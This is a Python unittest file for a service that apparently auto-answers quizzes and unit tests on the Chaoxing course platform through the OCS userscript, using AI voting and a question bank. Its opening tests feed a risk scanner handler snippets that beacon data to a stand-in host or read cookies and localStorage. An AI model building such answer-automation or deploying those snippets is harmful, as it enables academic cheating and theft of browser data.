        risky = scan_config_risks({"handler": 'return (res)=>{ navigator.sendBeacon("http://x", res); return [] }'})
        self.assertTrue(any(r["id"] == "beacon" for r in risky))
        risky = scan_config_risks({"handler": 'return (res)=>{ localStorage.getItem("t"); return [] }'})
        self.assertTrue(any(r["id"] == "storage" for r in risky))
        # 嵌套在 data.*.handler 里的也要扫到
        nested = scan_config_risks({"data": {"body": {"handler": "return (r)=>{ document.cookie }"}}})
        self.assertTrue(any(r["id"] == "cookie" for r in nested))

    def test_ocs_search_endpoint_returns_official_shape(self):
        """``/ocs/search`` 要返回官方脚本期望的 ``[[question, answer, extra]]``。

        官方脚本（v5.4.0）的 handler 契约：返回值必须是数组，数组里每项也是
        数组；否则它会当成"没搜到答案"。
        """
        self.client.post("/api/bank", json={"type": "judge", "title": "OCS 兼容题",
                                            "options": ["正确", "错误"], "answer": "正确",
                                            "subject": "默认"})
        resp = self.client.post("/ocs/search", json={
            "title": "OCS 兼容题", "type": "judge", "options": ["正确", "错误"],
        })
        self.assertEqual(resp.status_code, 200)
        payload = resp.json()
        self.assertIsInstance(payload, list)
        self.assertTrue(payload, "应返回一条结果")
        self.assertIsInstance(payload[0], list)
        self.assertEqual(payload[0][1], "正确")
        self.assertEqual(payload[0][0], "OCS 兼容题")
        # 没搜到时也要给空数组（官方脚本才能正确显示"没搜到"）
        empty = self.client.post("/ocs/search", json={
            "title": "库里没有的题", "type": "judge", "options": ["正确", "错误"],
        })
        self.assertEqual(empty.status_code, 200)
        self.assertEqual(empty.json(), [])

    def test_cors_only_allows_course_origins(self):
        evil = self.client.options(
            "/api/state",
            headers={"Origin": "https://evil.example", "Access-Control-Request-Method": "GET"},
        )
        self.assertIsNone(evil.headers.get("access-control-allow-origin"))
        course = self.client.options(
            "/api/progress",
            headers={"Origin": "https://mooc1.chaoxing.com", "Access-Control-Request-Method": "POST"},
        )
        self.assertEqual(course.headers.get("access-control-allow-origin"), "https://mooc1.chaoxing.com")

    def test_ingest_endpoints_require_token_when_configured(self):
        old = main.config.GATEWAY_TOKEN
        main.config.GATEWAY_TOKEN = "secret-test"
        try:
            self.assertEqual(
                self.client.post("/api/probe/heartbeat", json={"name": "probe-x"}).status_code, 401
            )
            self.assertEqual(
                self.client.post(
                    "/api/probe/heartbeat", json={"name": "probe-x", "token": "secret-test"}
                ).status_code,
                200,
            )
            progress = {"account": "a", "course": "c", "done": 1, "total": 2}
            self.assertEqual(self.client.post("/api/progress", json=progress).status_code, 401)
            self.assertEqual(
                self.client.post("/api/progress", json={**progress, "token": "secret-test"}).status_code,
                200,
            )
            self.assertEqual(self.client.post("/api/snapshot", json={"reason": "ping"}).status_code, 401)
            self.assertEqual(
                self.client.post(
                    "/api/snapshot", json={"reason": "ping"}, headers={"X-Gateway-Token": "secret-test"}
                ).status_code,
                200,
            )
        finally:
            main.config.GATEWAY_TOKEN = old

    def test_token_transport_rules(self):
        old = main.config.GATEWAY_TOKEN
        main.config.GATEWAY_TOKEN = "secret-test"
        try:
            # 管理接口：只认请求头，URL 参数不再接受
            self.assertEqual(
                self.client.get("/api/state", params={"token": "secret-test"}).status_code, 401
            )
            self.assertEqual(
                self.client.get(
                    "/api/state", headers={"X-Gateway-Token": "secret-test"}
                ).status_code,
                200,
            )
            # 答题接口：管理台生成的 OCS 配置把 token 放在 JSON body
            with mock.patch.object(
                main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')
            ):
                ok = self.client.post(
                    "/query",
                    json={
                        "title": "口令传递测试题",
                        "type": "single",
                        "options": ["甲", "乙"],
                        "token": "secret-test",
                    },
                )
                self.assertEqual(ok.status_code, 200)
                self.assertEqual(ok.json()["code"], 0)
            denied = self.client.get(
                "/query",
                params={
                    "title": "口令传递测试题",
                    "type": "single",
                    "options": '["甲","乙"]',
                    "token": "secret-test",
                },
            )
            self.assertEqual(denied.status_code, 200)
            self.assertEqual(denied.json()["code"], 40100)
            # 上报接口：body token 兼容，query token 拒绝
            self.assertEqual(
                self.client.post(
                    "/api/progress",
                    params={"token": "secret-test"},
                    json={"account": "a", "course": "c", "done": 1, "total": 2},
                ).status_code,
                401,
            )
        finally:
            main.config.GATEWAY_TOKEN = old

    def test_option_snapshot_endpoint_and_query_remap(self):
        import base64

        def img(payload: bytes) -> str:
            return "data:image/png;base64," + base64.b64encode(payload).decode()

        images = [img(b"one"), img(b"two"), img(b"three")]
        title = "选项快照集成测试题"
        payload = {
            "title": title, "type": "single",
            "options": [
                {"letter": "A", "image": images[0]},
                {"letter": "B", "image": images[1]},
                {"letter": "C", "image": images[2]},
            ],
        }
        result = self.client.post("/api/option-snapshot", json=payload).json()
        self.assertTrue(result["ok"])
        snapshot = main.option_snapshots.lookup("single", title, 3)
        self.assertIsNotNone(snapshot)
        self.assertTrue(
            main.option_snapshots.record_answer(result["key"], "B", snapshot["options"]))

        answer = self.client.get(
            "/query",
            params={"title": title, "type": "single", "options": '["A","B","C"]'},
        ).json()
        self.assertEqual(answer["code"], 0)
        self.assertEqual(answer["data"]["match"], "option-snapshot")
        self.assertEqual(answer["data"]["answer"], "B")
        self.assertFalse(answer["data"]["positional"])

        reordered = {
            "title": title, "type": "single",
            "options": [
                {"letter": "A", "image": images[1]},
                {"letter": "B", "image": images[0]},
                {"letter": "C", "image": images[2]},
            ],
        }
        again = self.client.post("/api/option-snapshot", json=reordered).json()
        self.assertTrue(again["order_changed"])
        answer2 = self.client.get(
            "/query",
            params={"title": title, "type": "single", "options": '["A","B","C"]'},
        ).json()
        self.assertEqual(answer2["data"]["match"], "option-snapshot")
        self.assertEqual(answer2["data"]["answer"], "A")
        self.assertGreaterEqual(
            self.client.get("/api/option-snapshots").json()["stats"]["remap_hits"], 1)

    def test_official_feedback_backfills_snapshot_answer(self):
        title = "官方回流快照测试题"
        options = ["行列互换值不变", "某行乘k值不变", "两行互换值变号"]
        created = self.client.post("/api/option-snapshot", json={
            "title": title, "type": "single",
            "options": [{"letter": letter, "text": text}
                        for letter, text in zip("ABC", options)],
        }).json()
        self.assertTrue(created["ok"])

        feedback = self.client.post("/api/bank/feedback", json={
            "items": [{
                "type": "single", "title": title, "options": options,
                "correct_letters": ["A"], "is_correct": True,
            }],
        })
        self.assertEqual(feedback.status_code, 200)
        snapshot = main.option_snapshots.lookup("single", title, 3)
        answer = main.option_snapshots.answer_for(snapshot)
        self.assertIsNotNone(answer)
        self.assertEqual(answer["letters"], "A")
        self.assertEqual(answer["source"], "page")

        reordered = {
            "title": title, "type": "single",
            "options": [
                {"letter": "A", "text": options[1]},
                {"letter": "B", "text": options[0]},
                {"letter": "C", "text": options[2]},
            ],
        }
        self.assertTrue(self.client.post("/api/option-snapshot", json=reordered).json()["order_changed"])
        remapped = self.client.get(
            "/query",
            params={"title": title, "type": "single", "options": '["A","B","C"]'},
        ).json()
        self.assertEqual(remapped["code"], 0)
        self.assertEqual(remapped["data"]["match"], "option-snapshot")
        self.assertEqual(remapped["data"]["answer"], "B")

    def test_option_snapshots_admin_list_and_delete(self):
        title = "快照管理测试题"
        body = {
            "title": title, "type": "single",
            "options": [{"letter": "A", "text": "甲"}, {"letter": "B", "text": "乙"}],
        }
        created = self.client.post("/api/option-snapshot", json=body).json()
        listing = self.client.get("/api/option-snapshots").json()
        self.assertTrue(listing["ok"])
        self.assertIn(created["key"], [item["key"] for item in listing["items"]])
        self.assertEqual(listing["stats"]["snapshots"], 1)
        self.assertIsNone(listing["items"][0]["answer"])

        self.assertTrue(self.client.delete("/api/option-snapshots/" + created["key"]).json()["ok"])
        self.assertEqual(self.client.get("/api/option-snapshots").json()["items"], [])

        self.client.post("/api/option-snapshot", json=body)
        self.assertTrue(self.client.delete("/api/option-snapshots").json()["ok"])
        self.assertEqual(self.client.get("/api/option-snapshots").json()["stats"]["snapshots"], 0)

    def test_solve_image_parses_vision_reply(self):
        import base64

        image = ("data:image/png;base64,"
                 + base64.b64encode(b"\x89PNG\r\n\x1a\n").decode())
        reply = ('{"title":"截图里的题目","type":"single","options":["甲","乙"],'
                 '"answer":"B","confidence":0.8}')
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value=reply)):
            resp = self.client.post("/api/solve-image", json={"image": image})
        self.assertEqual(resp.status_code, 200)
        data = resp.json()["data"]
        self.assertEqual(data["type"], "single")
        self.assertEqual(data["options"], ["甲", "乙"])
        self.assertEqual(data["answer"], "B")
        self.assertEqual(data["confidence"], 0.8)

    def test_solve_image_rejects_bad_input_and_bad_reply(self):
        self.assertEqual(self.client.post("/api/solve-image", json={}).status_code, 400)
        import base64

        image = ("data:image/png;base64,"
                 + base64.b64encode(b"\x89PNG\r\n\x1a\n").decode())
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value="看不懂")):
            resp = self.client.post("/api/solve-image", json={"image": image})
        self.assertEqual(resp.status_code, 502)

    def test_option_snapshot_rate_limit(self):
        old = main.config.SNAPSHOT_RATE_LIMIT
        main.config.SNAPSHOT_RATE_LIMIT = 1
        try:
            body = {
                "title": "限流测试题", "type": "single", "client_id": "rl-test",
                "options": [{"letter": "A", "text": "甲"}, {"letter": "B", "text": "乙"}],
            }
            self.assertEqual(
                self.client.post("/api/option-snapshot", json=body).status_code, 200)
            self.assertEqual(
                self.client.post("/api/option-snapshot", json=body).status_code, 429)
        finally:
            main.config.SNAPSHOT_RATE_LIMIT = old
            main._snapshot_hits.clear()

    def test_option_snapshot_rejects_url_and_requires_token(self):
        bad = self.client.post("/api/option-snapshot", json={
            "title": "坏图题", "type": "single",
            "options": [
                {"letter": "A", "image": "https://example.com/a.png"},
                {"letter": "B", "text": "文本"},
            ],
        })
        self.assertEqual(bad.status_code, 400)

        old = main.config.GATEWAY_TOKEN
        main.config.GATEWAY_TOKEN = "secret-test"
        try:
            body = {"title": "鉴权题", "type": "single", "options": [
                {"letter": "A", "text": "甲"}, {"letter": "B", "text": "乙"}]}
            self.assertEqual(
                self.client.post("/api/option-snapshot", json=body).status_code, 401)
            self.assertEqual(
                self.client.post(
                    "/api/option-snapshot", json={**body, "token": "secret-test"}
                ).status_code,
                200,
            )
        finally:
            main.config.GATEWAY_TOKEN = old

    def test_query_success_and_pending_verify(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            first = self.client.get(
                "/query", params={"title": "首都是哪", "type": "single", "options": '["北京","上海"]'}
            ).json()
            second = self.client.get(
                "/query", params={"title": "首都是哪", "type": "single", "options": '["北京","上海"]'}
            ).json()
        self.assertEqual(first["code"], 0)
        self.assertEqual(first["data"]["answer"], "B")
        self.assertFalse(first["data"]["cached"])
        self.assertEqual(second["data"]["match"], "pending-verify")
        self.assertEqual(second["data"]["agree"], 1)
        self.assertEqual(main.stats.total, 2)

    def test_query_post(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A#C"}')):
            data = self.client.post(
                "/query",
                json={"title": "多选", "type": "multiple", "options": ["甲", "乙", "丙"]},
            ).json()
        self.assertEqual(data["data"]["answer"], "A#C")

    def test_empty_official_answer_falls_through_to_ai(self):
        """官方记录答案为空时按未命中处理：空答案给脚本等于没答，应继续走 AI。"""
        main.bank.add({
            "type": "completion", "title": "空答案官方填空题", "options": [],
            "answer": "", "source": "official", "status": "adopted",
        })
        with mock.patch.object(main, "call_provider",
                               mock.AsyncMock(return_value='{"answer":"15"}')):
            data = self.client.post(
                "/query", json={"title": "空答案官方填空题", "type": "completion"}
            ).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "15")
        self.assertEqual(data["data"]["source"], "ai")

    def test_inspector_api_run_config_and_summary(self):
        """巡检接口：跑一次（跳过快照）→ 读配置与历史 → AI 摘要写回最近一次。"""
        main.bank.add({
            "type": "completion", "title": "巡检空答案", "options": [],
            "answer": "", "source": "official", "status": "adopted",
        })
        data = self.client.post("/api/inspector/run?snapshot=0&notify=0").json()
        ids = [f["id"] for f in data["run"]["findings"]]
        self.assertIn("official-empty", ids)
        self.assertFalse(data["run"]["snapshot"]["included"])

        cfg = self.client.post(
            "/api/inspector/config", json={"interval_hours": 12, "enabled": False}
        ).json()
        self.assertEqual(cfg["config"]["interval_hours"], 12)
        self.assertFalse(cfg["config"]["enabled"])

        listing = self.client.get("/api/inspector").json()
        self.assertIsNotNone(listing["latest"])
        self.assertEqual(len(listing["history"]), 1)
        self.assertEqual(listing["history"][0]["counts"]["P1"], 1)

        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value="巡检简报")):
            summary = self.client.post("/api/inspector/summarize").json()
        self.assertEqual(summary["summary"], "巡检简报")
        self.assertEqual(
            self.client.get("/api/inspector").json()["latest"]["ai_summary"], "巡检简报"
        )

    def test_bare_letter_options_fail_with_clear_reason(self):
        """选项只剩 A/B/C/D 且题库没有 → 报错要说清「选项是图片」，而不是笼统的 AI 失败。"""
        with mock.patch.object(main, "call_provider",
                               mock.AsyncMock(return_value='{"answer":"","confidence":0.0}')):
            data = self.client.post("/query", json={
                "title": "库里没有的纯字母选项题", "type": "single",
                "options": ["A", "B", "C", "D"],
            }).json()
        self.assertEqual(data["code"], 50001)
        self.assertIn("选项内容是图片", data["message"])
        self.assertNotIn("全部 AI 调用失败", data["message"])

    def test_text_option_failure_keeps_ai_error(self):
        """普通文字题失败时仍报原来的 AI 错误，不要被新提示覆盖。"""
        with mock.patch.object(main, "call_provider",
                               mock.AsyncMock(return_value='{"answer":"","confidence":0.0}')):
            data = self.client.post("/query", json={
                "title": "普通文字失败题", "type": "single",
                "options": ["甲", "乙", "丙", "丁"],
            }).json()
        self.assertEqual(data["code"], 50001)
        self.assertIn("全部 AI 调用失败", data["message"])

    def test_query_context_infers_unit_scene(self):
        """脚本没上报 scene 时，context 里的“单元测验”应触发多模型投票。"""
        async def fake(provider, messages):
            return '{"answer":"A"}'

        with mock.patch.object(main, "call_provider", fake):
            data = self.client.post(
                "/query",
                json={"title": "新题", "type": "single", "options": ["甲", "乙"],
                      "context": "第一章单元测验"},
            ).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["cross"], "unit-vote")
        self.assertEqual(data["data"]["scene"], "unit")
        self.assertEqual(data["data"]["vote"]["votes"], {"A": 1})
        # 只有一个模型答出时，不能自称「共识」
        self.assertIsNone(data["data"]["consensus"])
        self.assertTrue(data["data"]["risk"])
        self.assertNotEqual(data["data"]["cross"], "unit-consensus")

    def test_quiz_status_syncs_scene(self):
        self.assertEqual(main.scene_state.get(), "")
        self.client.post("/api/quiz/status", json={
            "tid": "1", "aid": "2", "name": "第一章单元测验", "url": "https://x/quiz",
        })
        self.assertEqual(main.scene_state.get(), "unit")
        self.client.post("/api/quiz/status", json={
            "tid": "3", "aid": "4", "name": "随堂练习", "url": "https://x/quick",
        })
        self.assertEqual(main.scene_state.get(), "quick")

    def test_unit_ready_skips_high_failure_provider(self):
        providers = [{"id": "bad", "name": "坏"}, {"id": "good", "name": "好"}]
        main.stats.per = {"bad": {"calls": 100, "fails": 80}, "good": {"calls": 100, "fails": 5}}
        self.assertEqual([p["name"] for p in main._unit_ready(providers)], ["好"])
        # 样本不足 20 次时不做判断
        main.stats.per = {"bad": {"calls": 10, "fails": 9}}
        self.assertEqual([p["name"] for p in main._unit_ready(providers)], ["坏", "好"])
        # 全部不合格时回退原顺序，避免投票无人可用
        main.stats.per = {"bad": {"calls": 100, "fails": 80},
                          "good": {"calls": 100, "fails": 90}}
        self.assertEqual([p["name"] for p in main._unit_ready(providers)], ["坏", "好"])

    def test_unit_ready_skips_provider_in_cooldown(self):
        first = {"id": "cool-a", "name": "A"}
        second = {"id": "cool-b", "name": "B"}
        main.stats.per = {}
        self.assertEqual(main._unit_ready([first, second]), [first, second])
        main._mark_failure("cool-a")
        self.assertEqual(main._unit_ready([first, second]), [first, second])
        # 最近 60 秒内失败 2 次 -> 冷却跳过
        main._mark_failure("cool-a")
        self.assertEqual(main._unit_ready([first, second]), [second])
        # 窗口外的失败不计入冷却
        main._recent_failures["cool-a"] = [time.time() - 120, time.time() - 120]
        self.assertEqual(main._unit_ready([first, second]), [first, second])
        # 全部冷却时回退原顺序，避免一时没有模型可用
        main._mark_failure("cool-a")
        main._mark_failure("cool-a")
        self.assertEqual(main._unit_ready([first]), [first])

    def test_failover_to_second_provider(self):
        main.store.add(
            {
                "name": "备用 AI",
                "base_url": "https://backup.example.com/v1",
                "api_key": "sk-backup",
                "model": "backup-model",
            }
        )
        calls = []

        async def fake(provider, messages):
            calls.append(provider["name"])
            if provider["name"] == "主 AI":
                raise ProviderError("HTTP 401: invalid key")
            return '{"answer":"A"}'

        with mock.patch.object(main, "call_provider", fake):
            data = self.client.get(
                "/query", params={"title": "题", "type": "single", "options": '["x","y"]'}
            ).json()

        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["provider"], "备用 AI")
        self.assertEqual(calls, ["主 AI", "备用 AI"])
        self.assertEqual(main.stats.failovers, 1)

    def test_all_providers_fail(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=ProviderError("boom"))):
            data = self.client.get(
                "/query", params={"title": "题", "type": "single", "options": '["x","y"]'}
            ).json()
        self.assertEqual(data["code"], 50001)
        self.assertIn("boom", data["message"])

    def test_unsupported_type(self):
        data = self.client.get("/query", params={"title": "简答", "type": "essay"}).json()
        self.assertEqual(data["code"], 40002)

    def test_query_completion(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"光合作用"}')):
            data = self.client.post(
                "/query",
                json={"title": "植物通过__制造有机物", "type": "completion", "options": []},
            ).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "光合作用")
        items = self.client.get("/api/bank").json()["items"]
        self.assertEqual(items[0]["type"], "completion")

    def test_missing_title(self):
        data = self.client.get("/query", params={"type": "single"}).json()
        self.assertEqual(data["code"], 40001)

    def test_admin_crud(self):
        created = self.client.post(
            "/api/providers",
            json={
                "name": "新 AI",
                "base_url": "https://new.example.com/v1",
                "api_key": "sk-new-9999",
                "model": "new-model",
            },
        )
        self.assertEqual(created.status_code, 200)
        pid = created.json()["id"]
        self.assertNotIn("sk-new-9999", created.text)

        state = self.client.get("/api/state").json()
        self.assertEqual(len(state["providers"]), 2)

        updated = self.client.put(f"/api/providers/{pid}", json={"name": "改名了", "base_url": "https://new.example.com/v1", "model": "new-model"})
        self.assertEqual(updated.json()["name"], "改名了")
        self.assertEqual(updated.json()["has_key"], True)

        self.assertTrue(self.client.delete(f"/api/providers/{pid}").json()["ok"])
        self.assertEqual(len(self.client.get("/api/state").json()["providers"]), 1)

    def test_provider_test_endpoint(self):
        pid = self.client.get("/api/state").json()["providers"][0]["id"]
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            data = self.client.post(f"/api/providers/{pid}/test").json()
        self.assertTrue(data["ok"])
        self.assertEqual(data["answer"], "A")

    def test_cache_clear(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            self.client.get("/query", params={"title": "t", "type": "single", "options": '["x","y"]'})
        self.assertEqual(self.client.post("/api/cache/clear").json()["cleared"], 1)
        self.assertEqual(self.client.get("/health").json()["cache"], 0)

    def test_bank_source_level(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            official = bank.add({"type": "judge", "title": "官方题", "options": ["对", "错"],
                                 "answer": "正确", "source": "official"})
            calibrated = bank.add({"type": "judge", "title": "校准题", "options": ["对", "错"],
                                   "answer": "正确", "source": "calibrated"})
            adopted_ai = bank.add({"type": "judge", "title": "已采纳AI", "options": ["对", "错"],
                                   "answer": "正确", "source": "ai", "status": "adopted"})
            pending_ai = bank.add({"type": "judge", "title": "待确认AI", "options": ["对", "错"],
                                   "answer": "正确", "source": "ai", "status": "pending"})
            manual = bank.add({"type": "judge", "title": "人工题", "options": ["对", "错"],
                               "answer": "正确", "source": "manual"})
            imported = bank.add({"type": "judge", "title": "导入题", "options": ["对", "错"],
                                 "answer": "正确", "source": "import"})
            self.assertEqual(official["level"], 4)
            self.assertEqual(manual["level"], 3)
            self.assertEqual(imported["level"], 3)
            self.assertEqual(calibrated["level"], 2)
            self.assertEqual(adopted_ai["level"], 2)
            self.assertEqual(pending_ai["level"], 1)

    def test_pending_cross_agree_skips_vote(self):
        main.settings.update({"cross_check": True, "low_conf_vote": True, "strict_official": False})
        main.bank.add({"type": "single", "title": "交叉共识题", "options": ["甲", "乙", "丙"],
                       "answer": "A", "status": "pending"})
        provider = main.store.enabled()[0]
        fake = ("B", provider, 5, [], {"cross": "agree"})
        with mock.patch.object(main, "_ask_limited", mock.AsyncMock(return_value=fake)),                 mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=AssertionError("不应再投票"))):
            data = self.client.get("/query", params={
                "title": "交叉共识题", "type": "single", "options": '["甲","乙","丙"]'
            }).json()
        self.assertEqual(data["data"]["answer"], "B")
        self.assertEqual(data["data"]["consensus"], "cross")
        self.assertIsNone(data["data"]["vote"])

    def test_low_conf_vote_adopts_on_majority(self):
        main.settings.update({"low_conf_vote": True})
        self.client.post("/api/bank", json={
            "type": "single", "title": "投票题", "options": ["甲", "乙", "丙"],
            "answer": "A", "source": "ai", "status": "pending"
        })
        texts = ['{"answer":"B"}', '{"answer":"B"}', '{"answer":"B"}', '{"answer":"C"}']
        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=texts)):
            data = self.client.get("/query", params={
                "title": "投票题", "type": "single", "options": '["甲","乙","丙"]'
            }).json()
        self.assertEqual(data["data"]["answer"], "B")
        self.assertEqual(data["data"]["vote"]["votes"], {"B": 2, "C": 1})
        # 一次投票只算一次确认，先保持待确认
        self.assertEqual(data["data"]["status"], "pending")
        for _ in range(2):
            with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
                data = self.client.get("/query", params={
                    "title": "投票题", "type": "single", "options": '["甲","乙","丙"]'
                }).json()
        self.assertEqual(data["data"]["answer"], "B")
        self.assertEqual(data["data"]["status"], "adopted")

    def test_low_conf_vote_keeps_pending_without_majority(self):
        main.settings.update({"low_conf_vote": True})
        self.client.post("/api/bank", json={
            "type": "single", "title": "投票分歧题", "options": ["甲", "乙", "丙"],
            "answer": "A", "status": "pending"
        })
        texts = ['{"answer":"B"}', '{"answer":"B"}', '{"answer":"C"}', '{"answer":"A"}']
        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=texts)):
            data = self.client.get("/query", params={
                "title": "投票分歧题", "type": "single", "options": '["甲","乙","丙"]'
            }).json()
        self.assertEqual(data["data"]["status"], "pending")
        self.assertEqual(data["data"]["vote"]["votes"], {"B": 1, "C": 1, "A": 1})

    def test_fast_hash_index_exact_hit_and_invalidation(self):
        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            item = bank.add({"type": "single", "title": "快速命中题", "options": ["甲", "乙"], "answer": "A"})
            hit = bank.match("single", "快速命中题", ["甲", "乙"], "默认")
            self.assertIsNotNone(hit)
            self.assertEqual(hit["_match"], "exact-hash")
            bank.update(item["id"], {"title": "改名后的题"})
            self.assertIsNone(bank.match("single", "快速命中题", ["甲", "乙"], "默认"))
            self.assertIsNotNone(bank.match("single", "改名后的题", ["甲", "乙"], "默认"))

    def test_vote_batch_counts(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                bank = Bank(os.path.join(tmp, "bank.json"))
                same = bank.add({"type": "judge", "title": "投票一致题", "options": ["对", "错"],
                                 "answer": "正确", "source": "ai", "status": "pending", "conflict": True})
                diff = bank.add({"type": "judge", "title": "投票不一致题", "options": ["对", "错"],
                                 "answer": "错误", "source": "ai", "status": "pending", "conflict": True})
                main.bank = bank
                main._vote_state.update({"running": True, "total": 2, "done": 0, "agree": 0, "disagree": 0,
                                         "unstable": 0, "failed": 0, "stop": False, "error": ""})
                with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"正确"}')):
                    await main._run_votes([bank.find_exact("judge", "投票一致题", ["对", "错"]),
                                           bank.find_exact("judge", "投票不一致题", ["对", "错"])], True, True)
                state = main._vote_status()
                self.assertEqual(state["done"], 2)
                self.assertEqual(state["agree"], 1)
                self.assertEqual(state["disagree"], 1)
                self.assertFalse(state["running"])
                self.assertTrue(bank.find_exact("judge", "投票不一致题", ["对", "错"])["answer"] == "错误")
        asyncio.run(run())

    def test_vote_batch_does_not_adopt_in_one_run(self):
        async def run():
            with tempfile.TemporaryDirectory() as tmp:
                bank = Bank(os.path.join(tmp, "bank.json"))
                bank.add({"type": "judge", "title": "投票单次题", "options": ["对", "错"],
                          "answer": "错误", "source": "ai", "status": "pending", "conflict": True})
                main.bank = bank
                main._vote_state.update({"running": True, "total": 1, "done": 0, "agree": 0,
                                         "disagree": 0, "unstable": 0, "failed": 0,
                                         "applied": 0, "stop": False, "error": ""})
                with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"正确"}')):
                    await main._run_votes([bank.find_exact("judge", "投票单次题", ["对", "错"])],
                                          False, False)
                row = bank.find_exact("judge", "投票单次题", ["对", "错"])
                self.assertEqual(row["answer"], "正确")
                self.assertEqual(row["status"], "pending")
                self.assertEqual(row["agree"], 0)
                self.assertTrue(row["conflict"])
        asyncio.run(run())

    def test_semantic_match_requires_negation_agreement(self):
        class FakeSemantic:
            threshold = 0.8

            def available(self):
                return True

            def best_match(self, text, items):
                return (items[0], 0.9) if items else None

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.set_semantic(FakeSemantic())
            bank.add({"type": "judge", "title": "矩阵相似则特征值相同", "options": ["对", "错"],
                      "answer": "正确", "source": "official"})
            hit = bank.match("judge", "相似矩阵的特征值相同", ["对", "错"], "默认", semantic=True)
            self.assertIsNotNone(hit)
            self.assertEqual(hit["_match"], "semantic")

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.set_semantic(FakeSemantic())
            bank.add({"type": "judge", "title": "方程组没有唯一解", "options": ["对", "错"],
                      "answer": "正确"})
            miss = bank.match("judge", "方程组有唯一解", ["对", "错"], "默认", semantic=True)
            self.assertIsNone(miss)

    def test_semantic_skipped_for_completion_without_options(self):
        """填空题没有选项锚定，语义召回不得拿另一道公式题顶上来。

        回归：题干只差图片 URL 的填空题，BGE 余弦轻松 0.9+，语义分支会用
        库里别的题答案顶包（实测 17 条无库记录填空题全部命中错题）。
        """
        class FakeSemantic:
            threshold = 0.8

            def available(self):
                return True

            def best_match(self, text, items):
                return (items[0], 0.99) if items else None

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            bank.set_semantic(FakeSemantic())
            bank.add({
                "type": "completion",
                "title": "设随机变量X的分布列为 http://img.alpha/a.png",
                "options": [], "answer": "1/3",
                "subject": "默认", "source": "official", "status": "adopted",
            })
            hit = bank.match(
                "completion",
                "若二维随机变量Y的分布函数为 http://cdn.beta/b.png",
                [], "默认", semantic=True,
            )
            self.assertIsNone(hit)

    def test_cross_disagree_arbitrated_by_vote(self):
        main.settings.update({"cross_check": True, "low_conf_vote": True, "strict_official": False})
        provider = main.store.enabled()[0]
        fake = ("B", provider, 5, [], {"cross": "disagree", "alt": "C"})
        with mock.patch.object(main, "_ask_limited", mock.AsyncMock(return_value=fake)), \
                mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            data = self.client.get("/query", params={
                "title": "交叉投票裁决题", "type": "single", "options": '["甲","乙","丙"]'
            }).json()
        self.assertEqual(data["data"]["answer"], "B")
        self.assertEqual(data["data"]["cross"], "voted-agree")
        self.assertEqual(data["data"]["vote"]["votes"], {"B": 3})
        row = main.bank.find_exact("single", "交叉投票裁决题", ["甲", "乙", "丙"])
        # 单次投票不能直接采纳，需要后续再次一致
        self.assertEqual(row["status"], "pending")
        for _ in range(2):
            with mock.patch.object(main, "_ask_limited", mock.AsyncMock(return_value=fake)), \
                    mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
                data = self.client.get("/query", params={
                    "title": "交叉投票裁决题", "type": "single", "options": '["甲","乙","丙"]'
                }).json()
        row = main.bank.find_exact("single", "交叉投票裁决题", ["甲", "乙", "丙"])
        self.assertEqual(row["status"], "adopted")

    def test_strict_mode_does_not_write_cache(self):
        main.settings.update({"cross_check": True, "low_conf_vote": False, "strict_official": True})
        provider = main.store.enabled()[0]
        fake = ("B", provider, 5, [], {"cross": "agree"})
        before = main.cache.count()
        with mock.patch.object(main, "_ask_limited", mock.AsyncMock(return_value=fake)):
            self.client.get("/query", params={
                "title": "严格模式不写缓存题", "type": "single", "options": '["甲","乙","丙"]'
            })
        self.assertEqual(main.cache.count(), before)

    def test_debounced_save_flushes_on_demand(self):
        import app.bank as bank_module
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "bank.json")
            old_threshold = bank_module.SAVE_DEBOUNCE_ITEMS
            bank_module.SAVE_DEBOUNCE_ITEMS = 0
            try:
                bank = Bank(path)
                bank.add({"type": "judge", "title": "延迟写盘题", "options": ["对", "错"], "answer": "正确"})
                with open(path, "r", encoding="utf-8") as fp:
                    self.assertNotIn("延迟写盘题", fp.read())
                bank.flush()
                with open(path, "r", encoding="utf-8") as fp:
                    self.assertIn("延迟写盘题", fp.read())
            finally:
                bank_module.SAVE_DEBOUNCE_ITEMS = old_threshold

    def test_bank_prune_archives_stale_ai_pending(self):
        main.bank = Bank(os.path.join(self.tmp.name, "prune.json"))
        stale = main.bank.add({"type": "judge", "title": "陈旧AI题", "options": ["对", "错"],
                               "answer": "正确", "source": "ai", "status": "pending"})
